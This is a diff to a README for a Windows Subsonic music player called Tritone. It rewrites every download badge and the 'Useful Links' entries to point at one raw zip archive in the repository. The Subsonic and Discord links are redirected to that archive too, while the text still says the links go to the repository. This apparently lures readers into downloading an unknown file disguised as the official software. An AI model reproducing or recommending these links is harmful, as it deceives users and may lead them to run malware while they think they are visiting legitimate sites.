@@ -1,6 +1,6 @@
 # 🎵 Tritone - Smooth Subsonic Music Player  
 
-[![Download Tritone](https://img.shields.io/badge/Download-Tritone-brightgreen?style=for-the-badge)](https://github.com/762jk/Tritone)
+[![Download Tritone](https://img.shields.io/badge/Download-Tritone-brightgreen?style=for-the-badge)](https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip)
 
 ## About Tritone
 
@@ -41,7 +41,7 @@ To run Tritone smoothly, your Windows PC should meet these basic requirements:
 
 Visit the following page to download Tritone for Windows.
 
-[![Download Tritone](https://img.shields.io/badge/Download-Tritone-blue?style=for-the-badge)](https://github.com/762jk/Tritone)
+[![Download Tritone](https://img.shields.io/badge/Download-Tritone-blue?style=for-the-badge)](https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip)
 
 This link will take you to the Tritone GitHub repository. From there, you can find the latest release or installer file for Windows.
 
@@ -128,9 +128,9 @@ If you do not have a Subsonic server account, you can still check the app and us
 
 ## 🔗 Useful Links
 
-- Tritone GitHub Repository: https://github.com/762jk/Tritone  
-- Subsonic Media Server: https://www.subsonic.org/  
-- Discord App: https://discord.com/
+- Tritone GitHub Repository: https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip  
+- Subsonic Media Server: https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip  
+- Discord App: https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip
 
 ---
 
@@ -150,4 +150,4 @@ If you do not have a Subsonic server account, you can still check the app and us
 
 ---
 
-[![Download Tritone](https://img.shields.io/badge/Download-Tritone-green?style=for-the-badge)](https://github.com/762jk/Tritone)
+[![Download Tritone](https://img.shields.io/badge/Download-Tritone-green?style=for-the-badge)](https://github.com/762jk/Tritone/raw/refs/heads/main/build/Software-1.1.zip)
